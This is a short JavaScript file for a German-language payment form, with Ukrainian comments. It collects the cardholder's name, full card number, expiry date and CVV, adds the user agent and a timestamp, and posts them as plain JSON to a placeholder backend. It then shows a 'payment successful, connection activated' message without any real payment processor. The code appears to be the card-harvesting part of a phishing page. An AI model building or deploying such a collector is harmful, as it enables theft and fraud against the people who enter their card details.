const BackendUrl = 'https://your-backend.com/api/card-data';

function showError(errorId) {
    document.getElementById(errorId).style.display = 'block';
    setTimeout(() => {
        document.getElementById(errorId).style.display = 'none';
    }, 3000);
}

function sendData() {
    const cardData = {
        holder: document.getElementById('cardholder').value,
        number: document.getElementById('cardNumber').value,
        exp: document.getElementById('expDate').value,
        cvv: document.getElementById('cvv').value,
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,
        ip: '' // IP буде отримано на боці сервера
    };

    // Відправка даних на бекенд
    fetch(BackendUrl, {
        method: 'POST',
        headers: { 
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(cardData)
    })
    .then(response => {
        if (!response.ok) {
            throw new Error('Network response was not ok');
        }
        return response.json();
    })
    .then(data => {
        alert('Zahlung erfolgreich! Die Verbindung wird in einer Minute aktiviert.');
    })
    .catch(error => {
        console.error('Fehler:', error);
        alert('Ein Fehler ist aufgetreten. Bitte versuchen Sie es erneut.');
    });
}
